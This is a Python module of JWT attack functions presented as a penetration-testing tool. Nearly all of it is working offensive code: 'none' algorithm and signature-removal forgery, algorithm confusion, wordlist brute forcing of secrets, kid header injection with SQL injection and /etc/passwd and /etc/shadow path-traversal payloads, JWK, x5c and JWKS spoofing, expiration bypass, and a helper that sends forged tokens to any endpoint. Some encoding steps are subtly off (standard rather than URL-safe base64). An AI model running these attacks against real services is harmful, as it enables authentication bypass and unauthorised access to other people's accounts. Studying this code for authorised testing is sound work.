"""
JWT Attack Module

This module provides functions for analyzing JWT security vulnerabilities
and performing various JWT security tests. These functions are designed for security research and penetration testing.
"""

import jwt
import json
import base64
import hashlib
import hmac
import os
import datetime
from cryptography import x509
from cryptography.x509 import oid
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import time
import logging
import requests
from typing import Dict, Any, List, Optional, Tuple, Union

class JWTSecurityTester:
    """
    Provides security testing functionality for JWT tokens.
    
    This module offers methods to test JWT implementations against common 
    vulnerabilities including algorithm confusion, signature bypass, and brute force attacks.
    """
    
    def __init__(self, key_manager=None):
        """
        Initialize the security tester.
        
        Args:
            key_manager: Optional reference to a KeyManager instance for key operations
        """
        self.logger = logging.getLogger("security_tester")
        self.key_manager = key_manager
    
    @staticmethod
    def decode_token_parts(token):
        """Decode token without verification to extract header and payload"""
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        header = json.loads(base64.b64decode(parts[0] + '==' * (-len(parts[0]) % 4)).decode('utf-8'))
        payload = json.loads(base64.b64decode(parts[1] + '==' * (-len(parts[1]) % 4)).decode('utf-8'))
        
        return header, payload, parts[2]  # header, payload, signature
    
    @staticmethod
    def none_algorithm_attack(token):
        """Test token against the none algorithm vulnerability"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Modify the header to use 'none' algorithm
            header['alg'] = 'none'
            
            # Encode header and payload
            encoded_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Create new token with empty signature
            forged_token = f"{encoded_header}.{encoded_payload}."
            
            return {
                "success": True,
                "forged_token": forged_token,
                "message": "None algorithm attack successful"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def algorithm_confusion_attack(token, public_key):
        """Perform an algorithm confusion attack"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Convert the public key to the format needed
            try:
                # Try to parse the key (assuming PEM format)
                serialization.load_pem_public_key(
                    public_key.encode(),
                    backend=default_backend()
                )
                
                # Generate a new token using the HS256 algorithm with the public key as the secret
                public_key_bytes = public_key.encode()
                
                # Change algorithm to HS256
                header['alg'] = 'HS256'
                
                # Encode header and payload
                encoded_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
                encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Create signature using the public key as the secret
                
                forged_signature = jwt.encode(
                    payload, 
                    public_key_bytes, 
                    algorithm='HS256', 
                    headers=header
                ).split('.')[2]
                
                forged_token = f"{encoded_header}.{encoded_payload}.{forged_signature}"
                
                return {
                    "success": True,
                    "forged_token": forged_token,
                    "message": "Algorithm confusion attack successful"
                }
            except Exception as key_error:
                return {
                    "success": False,
                    "error": f"Public key processing error: {str(key_error)}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def jwt_brute_force(token, wordlist):
        """Perform a brute force attack on the JWT token"""
        try:
            # Parse wordlist (assuming it's a newline-separated string)
            passwords = wordlist.split('\n')
            
            # Remove any empty lines
            passwords = [p for p in passwords if p.strip()]
            
            if not passwords:
                return {
                    "success": False,
                    "error": "Wordlist is empty"
                }
            
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            algorithm = header.get('alg', 'HS256')
            
            # Try each password in the wordlist
            for password in passwords:
                try:
                    # Attempt to verify the token with the current password
                    decoded = jwt.decode(token, password, algorithms=[algorithm])
                    
                    # If we get here, the password worked
                    return {
                        "success": True,
                        "secret": password,
                        "decoded_payload": decoded,
                        "message": f"Secret found: {password}"
                    }
                except jwt.exceptions.InvalidSignatureError:
                    # Wrong password, continue to the next one
                    continue
                except Exception as decode_error:
                    # Some other error occurred
                    continue
            
            # If we get here, none of the passwords worked
            return {
                "success": False,
                "message": "No matching secret found in wordlist"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def kid_injection_attack(token, kid_value):
        """Perform a Key ID (kid) injection attack"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Modify the header to include the injected kid parameter
            header['kid'] = kid_value
            
            # Create a new token with the modified header
            # Using a well-known secret for demonstration ('secret' in this case)
            forged_token = jwt.encode(payload, 'secret', algorithm='HS256', headers=header)
            
            return {
                "success": True,
                "forged_token": forged_token,
                "message": f"KID injection attack successful with kid value: {kid_value}"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def jwks_spoofing(token):
        """Generate a spoofed JWKS (JSON Web Key Set) with corresponding token"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Generate a new RSA key pair
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            public_key = private_key.public_key()
            
            # Get key components for the JWK
            private_numbers = private_key.private_numbers()
            public_numbers = public_key.public_numbers()
            
            # Create a unique key ID
            kid = "attacker-key-" + str(int(time.time()))
            
            # Create a JWK representation of the public key
            jwk = {
                "kty": "RSA",
                "use": "sig",
                "kid": kid,
                "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
                "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
            }
            
            # Create a JWKS
            jwks = {
                "keys": [jwk]
            }
            
            # Modify the header to use RS256 and the spoofed kid
            header['alg'] = 'RS256'
            header['kid'] = kid
            
            # Convert private key to PEM string format for JWT encoding
            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')  # Convert bytes to string
            
            forged_token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=header)
            
            return {
                "success": True,
                "forged_token": forged_token,
                "jwks": jwks,
                "message": "JWKS spoofing attack successful"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def token_expiration_bypass(token):
        """Bypass token expiration by removing or extending exp claim"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Check if token has expiration
            if 'exp' not in payload:
                return {
                    "success": False,
                    "message": "Token doesn't have an expiration claim to bypass"
                }
            
            # Strategy 1: Remove expiration
            payload_no_exp = dict(payload)
            del payload_no_exp['exp']
            
            # Strategy 2: Extend expiration by 10 years
            payload_extended = dict(payload)
            payload_extended['exp'] = int(time.time()) + (10 * 365 * 24 * 60 * 60)  # 10 years
            
            # Create both tokens (for demonstration)
            # Using a dummy secret for demonstration
            token_no_exp = jwt.encode(payload_no_exp, 'secret', algorithm=header['alg'])
            token_extended = jwt.encode(payload_extended, 'secret', algorithm=header['alg'])
            
            return {
                "success": True,
                "token_with_no_expiration": token_no_exp,
                "token_with_extended_expiration": token_extended,
                "message": "Token expiration bypass techniques applied"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def test_token_against_endpoint(token, url, method):
        """Test a JWT token against a specified endpoint"""
        try:
            # Initialize response as None
            response = None
            
            # Validate method
            method = method.upper()
            if method not in ['GET', 'POST', 'PUT', 'DELETE']:
                return {
                    "success": False,
                    "error": f"Unsupported HTTP method: {method}"
                }
            
            # Prepare headers with Authorization
            headers = {
                "Authorization": f"Bearer {token}"
            }
            
            # Make the request based on the method
            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            elif method == 'POST':
                response = requests.post(url, headers=headers, json={}, timeout=10)
            elif method == 'PUT':
                response = requests.put(url, headers=headers, json={}, timeout=10)
            elif method == 'DELETE':
                response = requests.delete(url, headers=headers, timeout=10)
            
            if response is None:
                return {
                    "success": False,
                    "error": "Failed to make request"
                }
            
            # Return response details
            return {
                "success": True,
                "status_code": response.status_code,
                "response_text": response.text,
                "message": f"Request completed with status code: {response.status_code}"
            }
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "error": "Request timed out"
            }
        except requests.exceptions.ConnectionError:
            return {
                "success": False,
                "error": "Connection error, check the URL"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def signature_removal_attack(token):
        """Test signature removal vulnerability by removing the signature portion"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Encode header and payload
            encoded_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Create new token with empty signature
            forged_token = f"{encoded_header}.{encoded_payload}."
            
            return {
                "success": True,
                "forged_token": forged_token,
                "message": "Signature removal attack applied - some servers may accept this token if signature validation is improperly implemented"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def key_injection_attack(token):
        """Test for key injection vulnerability in the header"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Define some common paths for injection
            injection_values = [
                "../../../dev/null",
                "/dev/null",
                "file:///dev/null",
                "file://etc/passwd"
            ]
            
            results = []
            for inject_val in injection_values:
                # Create a copy of the header with the injected kid
                modified_header = dict(header)
                modified_header['kid'] = inject_val
                
                # Encode the modified header and the original payload
                encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
                encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Use a simple signature (this would only work if the server is vulnerable)
                forged_token = f"{encoded_header}.{encoded_payload}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                
                results.append({
                    "injection_value": inject_val,
                    "forged_token": forged_token
                })
            
            return {
                "success": True,
                "results": results,
                "message": "Key injection attack tokens generated"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def kid_sql_injection_attack(token):
        """Test for SQL injection vulnerability in the kid parameter"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Define some SQL injection payloads
            sql_payloads = [
                "' OR 1=1 -- ",
                "' UNION SELECT secret FROM keys -- ",
                "'; SELECT * FROM keys -- ",
                "1' OR '1'='1"
            ]
            
            results = []
            for sql_payload in sql_payloads:
                # Create a copy of the header with the SQL injection
                modified_header = dict(header)
                modified_header['kid'] = sql_payload
                
                # Encode the modified header and the original payload
                encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
                encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Use a simple signature
                forged_token = f"{encoded_header}.{encoded_payload}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                
                results.append({
                    "sql_payload": sql_payload,
                    "forged_token": forged_token
                })
            
            return {
                "success": True,
                "results": results,
                "message": "SQL injection attack tokens generated"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    @staticmethod
    def kid_directory_traversal_attack(token):
        """Test for directory traversal vulnerability in the kid parameter"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Define path traversal payloads
            path_payloads = [
                "../../../../etc/passwd",
                "../../../../../../../etc/shadow",
                "../../../../../../../dev/null",
                "../../../../../../../../tmp/dummy"
            ]
            
            results = []
            for path_payload in path_payloads:
                # Create a copy of the header with the path traversal
                modified_header = dict(header)
                modified_header['kid'] = path_payload
                
                # Encode the modified header and the original payload
                encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
                encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Use a simple signature
                forged_token = f"{encoded_header}.{encoded_payload}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                
                results.append({
                    "path_payload": path_payload,
                    "forged_token": forged_token
                })
            
            return {
                "success": True,
                "results": results,
                "message": "Directory traversal attack tokens generated"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def brute_force_secret(token, wordlist):
        """Perform an optimized brute force attack on a token's secret"""
        try:
            # Get the token parts
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            algorithm = header.get('alg', 'HS256')
            
            # Only HMAC algorithms can be brute-forced
            if not algorithm.startswith('HS'):
                return {
                    "success": False,
                    "error": f"Cannot brute force tokens using {algorithm} algorithm. Only HMAC algorithms (HS256, HS384, HS512) can be brute-forced."
                }
                
            # Try each word in the wordlist
            for word in wordlist:
                try:
                    # Convert to string if it's bytes
                    if isinstance(word, bytes):
                        word = word.decode('utf-8')
                        
                    # Try to verify with this secret
                    decoded = jwt.decode(token, word, algorithms=[algorithm])
                    
                    # If we get here without an exception, we found the secret
                    return {
                        "success": True,
                        "secret_found": word,
                        "decoded_payload": decoded,
                        "message": "Secret found! Token can be forged."
                    }
                except jwt.exceptions.InvalidSignatureError:
                    # Wrong password, continue to the next one
                    continue
                except Exception as e:
                    # Log other exceptions but continue trying
                    print(f"Exception with word '{word}': {str(e)}")
                    continue
            
            # If we reach here, no secret was found
            return {
                "success": False,
                "message": "No matching secret found in wordlist",
                "words_checked": len(wordlist)
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def run_all_attacks(token, public_key=None, wordlist=None):
        """Run all available attacks on a token and return a comprehensive report"""
        results = {}
        
        # Run individual attacks
        results["none_algorithm"] = JWTSecurityTester.none_algorithm_attack(token)
        
        if public_key:
            results["algorithm_confusion"] = JWTSecurityTester.algorithm_confusion_attack(token, public_key)
        
        results["signature_removal"] = JWTSecurityTester.signature_removal_attack(token)
        results["key_injection"] = JWTSecurityTester.key_injection_attack(token)
        results["kid_sql_injection"] = JWTSecurityTester.kid_sql_injection_attack(token)
        results["kid_directory_traversal"] = JWTSecurityTester.kid_directory_traversal_attack(token)
        
        if wordlist:
            results["brute_force"] = JWTSecurityTester.brute_force_secret(token, wordlist)
        
        # Check which attacks were successful
        successful_attacks = []
        for attack_name, attack_result in results.items():
            if attack_result.get("success", False):
                successful_attacks.append(attack_name)
        
        # Compile overall results
        return {
            "successful_attacks": successful_attacks,
            "attack_results": results,
            "success": len(successful_attacks) > 0,
            "message": f"Successfully executed {len(successful_attacks)} out of {len(results)} attacks"
        }

    @staticmethod
    def jwk_injection_attack(token):
        """Test for JWK header injection vulnerability"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Generate a new key pair for the attack
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            public_key = private_key.public_key()
            
            # Get key components for the JWK
            public_numbers = public_key.public_numbers()
            
            # Create JWK representation
            jwk = {
                "kty": "RSA",
                "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
                "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
            }
            
            # Modify header to include our JWK
            modified_header = dict(header)
            modified_header['jwk'] = jwk
            
            # Create new token with the injected JWK
            encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Sign with our private key
            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')  # Convert bytes to string
            signature = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=modified_header).split('.')[2]
            
            forged_token = f"{encoded_header}.{encoded_payload}.{signature}"
            
            return {
                "success": True,
                "forged_token": forged_token,
                "message": "JWK injection attack successful",
                "injected_jwk": jwk
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @staticmethod
    def x5c_injection_attack(token):
        """Test for X.509 certificate chain injection vulnerability"""
        try:
            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
            
            # Generate a new key pair and self-signed certificate
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # Create self-signed certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(oid.NameOID.COMMON_NAME, u"attacker.local")
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=365)
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Get certificate in PEM format and base64 encode
            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
            cert_der = cert.public_bytes(serialization.Encoding.DER)
            cert_b64 = base64.b64encode(cert_der).decode('utf-8')
            
            # Modify header to include our certificate
            modified_header = dict(header)
            modified_header['x5c'] = [cert_b64]
            
            # Create new token with the injected certificate
            encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Sign with our private key
            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')  # Convert bytes to string
            signature = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=modified_header).split('.')[2]
            
            forged_token = f"{encoded_header}.{encoded_payload}.{signature}"
            
            return {
                "success": True,
                "forged_token": forged_token,
                "message": "X.509 certificate injection attack successful",
                "injected_certificate": cert_pem.decode('utf-8')
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

class JWTTester:
    """
    Provides comprehensive JWT testing functionality.
    
    This module offers methods to test JWT implementations against common 
    vulnerabilities and security issues for authorized security assessment.
    """
    
    def __init__(self, key_manager=None):
        """
        Initialize the JWT tester.
        
        Args:
            key_manager: Optional reference to a KeyManager instance for key operations
        """
        self.logger = logging.getLogger("jwt_tester")
        self.key_manager = key_manager
    
    def algorithm_confusion_attack(self, token: str, public_key: str) -> str:
        """
        Perform an algorithm confusion attack by switching between asymmetric and symmetric algorithms.
        
        Args:
            token: The original JWT token
            public_key: Public key in PEM format
            
        Returns:
            Modified JWT token vulnerable to algorithm confusion
        """
        try:
            # Decode token without verification
            payload = jwt.decode(token, options={"verify_signature": False})
            header = jwt.get_unverified_header(token)
            
            # Check if we can perform algorithm confusion
            original_alg = header.get("alg", "")
            
            if original_alg.startswith("RS") or original_alg.startswith("ES"):
                # Change from asymmetric (RS*/ES*) to symmetric (HS*)
                new_alg = "HS256"
                
                # Create new token using the public key as the HMAC secret
                header["alg"] = new_alg
                return jwt.encode(payload, public_key, algorithm=new_alg, headers=header)
            
            return ""
            
        except Exception as e:
            self.logger.error(f"Algorithm confusion attack failed: {str(e)}")
            return ""
    
    def jwt_brute_force(self, token: str, wordlist: List[str], algorithm: str = "HS256") -> Optional[str]:
        """
        Attempt to brute force a JWT token's secret key using a wordlist.
        
        Args:
            token: The JWT token to attack
            wordlist: List of potential secrets to try
            algorithm: The algorithm to use for verification
            
        Returns:
            The secret key if found, None otherwise
        """
        try:
            # Extract the header and payload
            header_b64, payload_b64, signature_b64 = token.split('.')
            message = f"{header_b64}.{payload_b64}"
            
            # Try each word in the wordlist
            for secret in wordlist:
                try:
                    # Verify the token with the current secret
                    jwt.decode(token, secret, algorithms=[algorithm])
                    return secret
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                    
            return None
            
        except Exception as e:
            self.logger.error(f"Brute force attack failed: {str(e)}")
            return None
    
    def kid_injection_attack(self, token: str, payload_claims: Dict[str, Any], 
                            injection_value: str = "../../../dev/null") -> str:
        """
        Perform a Key ID (kid) header injection attack.
        
        Args:
            token: The original JWT token
            payload_claims: Claims to include in the payload
            injection_value: The value to inject in the kid parameter
            
        Returns:
            JWT token with kid injection
        """
        try:
            # Create a header with an injectable kid parameter
            header = {
                "alg": "HS256",
                "typ": "JWT",
                "kid": injection_value
            }
            
            # Create the token with an empty signature (commonly accepted when using the injected file)
            return jwt.encode(payload_claims, "", algorithm="HS256", headers=header)
            
        except Exception as e:
            self.logger.error(f"KID injection attack failed: {str(e)}")
            return ""
    
    def jwks_spoofing(self, token: str, payload: Dict[str, Any]) -> Tuple[str, Dict[str, Any]]:
        """
        Generate a spoofed JWT and corresponding JWKS that would validate it.
        
        Args:
            token: Original JWT token for reference
            payload: The payload to include in the spoofed token
            
        Returns:
            Tuple of (spoofed_token, jwks_data)
        """
        try:
            # Generate a new RSA key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            
            # Extract components for the JWKS
            public_numbers = private_key.public_key().public_numbers()
            
            # Create a unique key ID
            kid = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
            
            # Create the token with the new key
            header = {
                "alg": "RS256",
                "typ": "JWT",
                "kid": kid
            }
            
            # Convert private key to PEM format for JWT encoding
            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')
            
            # Create token with our private key
            token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header)
            
            # Create the JWKS
            jwks = {
                "keys": [
                    {
                        "kty": "RSA",
                        "kid": kid,
                        "use": "sig",
                        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
                        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
                    }
                ]
            }
            
            return token, jwks
            
        except Exception as e:
            self.logger.error(f"JWKS spoofing failed: {str(e)}")
            return "", {}
    
    def token_expiration_bypass(self, token: str) -> str:
        """
        Attempt to bypass token expiration by modifying the 'exp' claim.
        
        Args:
            token: The original JWT token
            
        Returns:
            Modified JWT token with extended expiration
        """
        try:
            # Decode the token without verification
            payload = jwt.decode(token, options={"verify_signature": False})
            header = jwt.get_unverified_header(token)
            
            # Modify the expiration time
            if "exp" in payload:
                # Set expiration to a far future date
                payload["exp"] = int(time.time()) + 31536000  # 1 year in the future
            
            # For tokens using HMAC, try using an empty signature
            if header.get("alg", "").startswith("HS"):
                # Encode header and payload without a valid signature
                header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
                payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
                return f"{header_encoded}.{payload_encoded}."
            
            # Otherwise create a new token without verification
            return jwt.encode(payload, "attackkey", algorithm="HS256")
            
        except Exception as e:
            self.logger.error(f"Token expiration bypass failed: {str(e)}")
            return ""
    
    def test_token_against_endpoint(self, url: str, token: str, 
                                   method: str = "GET", 
                                   headers: Optional[Dict[str, str]] = None,
                                   data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Test a potentially malicious token against an endpoint.
        
        Args:
            url: The endpoint URL to test
            token: JWT token to test
            method: HTTP method to use
            headers: Additional headers to include
            data: Request body data
            
        Returns:
            Response data including status code and content
        """
        try:
            # Prepare headers
            request_headers = headers or {}
            request_headers["Authorization"] = f"Bearer {token}"
            
            # Make the request
            response = requests.request(
                method=method,
                url=url,
                headers=request_headers,
                json=data
            )
            
            # Return the result
            return {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "content": response.text,
                "success": 200 <= response.status_code < 300
            }
            
        except Exception as e:
            self.logger.error(f"Endpoint testing failed: {str(e)}")
            return {
                "status_code": 0,
                "error": str(e),
                "success": False
            }